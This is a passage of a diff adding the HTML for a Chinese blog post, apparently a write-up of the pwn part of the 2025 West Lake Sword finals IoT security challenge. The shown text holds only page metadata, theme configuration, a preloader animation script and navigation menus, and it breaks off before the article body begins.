@@ -1,0 +1,1379 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="两只羊">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://twogoat.github.io/2025/12/05/2025西湖论剑决赛iot安全挑战-漏洞挖掘部分/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="前言最近在学习IOT安全，刚好队友把西湖论剑决赛的板子带回来了，就来试着做一做。 相比24年给的openwrt开发版上进行应急响应，今年提供的树莓派少了很多硬件上的操作，直接ssh上去就可以做题了，省略了固件提取的部分，甚至给了完整的镜像，更偏向CTF的解题模式。 目前只做了pwn的部分，漏洞点本身不难，但优化去符号的程序给分析带来了极大的困难，需要具备一定的逆向能力。 题目镜像链接 https:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="西湖论剑2025决赛IOT安全挑战(漏洞挖掘部分)">
+<meta property="og:url" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/index.html">
+<meta property="og:site_name" content="twogoatの小站">
+<meta property="og:description" content="前言最近在学习IOT安全，刚好队友把西湖论剑决赛的板子带回来了，就来试着做一做。 相比24年给的openwrt开发版上进行应急响应，今年提供的树莓派少了很多硬件上的操作，直接ssh上去就可以做题了，省略了固件提取的部分，甚至给了完整的镜像，更偏向CTF的解题模式。 目前只做了pwn的部分，漏洞点本身不难，但优化去符号的程序给分析带来了极大的困难，需要具备一定的逆向能力。 题目镜像链接 https:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/34d23889d9927aa2b1f6e97a59f3cca5.jpg">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201170215253.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201164859803.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201170116882.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201193633831.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/381faa3d492e78ddcb55920fc55feeb3.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203253738.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203308525.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203327397.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201202455041.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201202546720.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201202536258.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203206991.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251201203634858.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/7c7111383d898a85f7e28a84b5788213.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202091536205.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205103326398.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202184759523.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202184918814.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203212053817.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202193059044.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204152206999.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204143736446.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/813294cd67255d6691331550afce8995.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204150631122.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204154633631.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204151513241.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204151630455.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204152350304.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205103751678.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205103828534.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251202094619157.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205104058391.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205105433537.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251205104020110.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203192338508.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203195925915.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203195851465.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203200249450.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251203200850011.png">
+<meta property="og:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/image-20251204152011060.png">
+<meta property="article:published_time" content="2025-12-05T02:08:59.000Z">
+<meta property="article:modified_time" content="2025-12-05T03:04:40.956Z">
+<meta property="article:author" content="twogoat&#x2F;showmaker">
+<meta property="article:tag" content="IOT">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://twogoat.github.io/2025/12/05/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%86%B3%E8%B5%9BIOT%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E9%83%A8%E5%88%86/34d23889d9927aa2b1f6e97a59f3cca5.jpg">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            西湖论剑2025决赛IOT安全挑战(漏洞挖掘部分) | twogoat/showmakerの小站
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"twogoat.github.io","root":"/","language":"zh-CN"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"5rem","h2":"4rem","h3":"2.8rem","h4":"2.5rem","h5":"2.2rem","h6":"2rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/2.png","dark":"/images/2.png"},"title":"twogoat的妙妙屋","subtitle":{"text":["随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","欢迎来到我的博客(｡･∀･)ﾉﾞ","正在努力更新博客(ง •_•)ง"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"icon":"fa-solid fa-tags","path":"/tags"},"About Me":{"icon":"fa-regular fa-link","path":"/about"},"Links":{"icon":"fa-regular fa-link","path":"/links"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        twogoat/showmakerの小站
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                twogoat/showmakerの小站
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    归档
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    ABOUT ME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/links"
+                                        >
+                                    <i class="fa-regular fa-link fa-fw"></i>
+                                    链接
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                归档
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
